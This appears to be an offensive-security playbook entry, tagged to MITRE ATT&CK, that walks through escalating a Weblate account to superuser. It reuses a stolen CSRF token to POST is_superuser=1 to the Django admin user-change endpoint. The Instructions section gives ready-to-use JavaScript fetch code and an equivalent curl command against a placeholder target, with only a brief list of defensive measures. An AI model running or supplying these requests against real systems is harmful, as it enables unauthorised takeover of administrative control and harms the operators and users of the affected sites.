---
tags:
  - privilege-escalation
  - superuser
type: procedure
tools:
  - '[[tools/payload-js]]'
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/post-weblate-user-update]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Privilege Escalation]]'
updated_at: '2025-12-14T03:16:20.245Z'
sub_techniques: []
id: a08d6cd2-af7b-4000-bfb9-0b2a7cf9ddd4
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploitation for Privilege Escalation]]'
---
# Escalate-Privileges-to-Superuser-via-Weblate-Admin-POST

## Summary

This procedure uses the stolen CSRF token to POST an update to the user's admin profile, setting `is_superuser` to true and achieving full administrative control.

## Description

With the token, `payload.js` submits a POST to `/admin/weblate_auth/user/<ID>/change/` including the token and `is_superuser=1`. This exploits the authenticated context to modify permissions, limited only by the session's scope but effective for self-escalation.

## Requirements

1. Extracted CSRF token and user ID
2. Valid session for admin POSTs
3. Knowledge of Django form parameters

## Defense

Defensive measures and detection strategies:

- Audit logs for permission changes
- Require multi-factor for admin actions
- Validate POSTs with additional checks beyond CSRF

## Objectives

1. Update user record to grant superuser status
2. Achieve persistent high-privilege access
3. Confirm escalation without logout

## Instructions

### Step 1: Prepare POST Data

**Context**: Construct the form data with token and superuser flag.

In `payload.js` (userId=5, csrfToken='abc123...'):

```javascript
const formData = new FormData();
formData.append('csrfmiddlewaretoken', csrfToken);
formData.append('is_superuser', '1');

fetch(`/admin/weblate_auth/user/${userId}/change/`, {
  method: 'POST',
  body: formData,
  credentials: 'same-origin'
}).then(r => r.text()).then(html => {
  // Check for success message
});
```

Equivalent curl: Execute [[commands/post-weblate-user-update]]:

```bash
curl -X POST "https://weblate-target.com/admin/weblate_auth/user/5/change/" \
  -H "Cookie: sessionid=your_session" \
  -H "Referer: https://weblate-target.com/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "csrfmiddlewaretoken=abc123def456...&is_superuser=1"
```

> Submits the update; Django processes the form.

**Expected Output**: Redirect or success HTML, e.g., "The user has been changed successfully."

### Step 2: Verify Escalation

**Context**: Test new privileges by accessing superuser-only features.

Refresh and attempt admin dashboard access.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]]

### Techniques

- [[Exploitation for Privilege Escalation]]

### Sub-Techniques


## Commands Used

- [[commands/post-weblate-user-update]]

## Tools Used

- [[tools/payload-js]]

## Tags

- [[privilege-escalation]]
- [[superuser]]
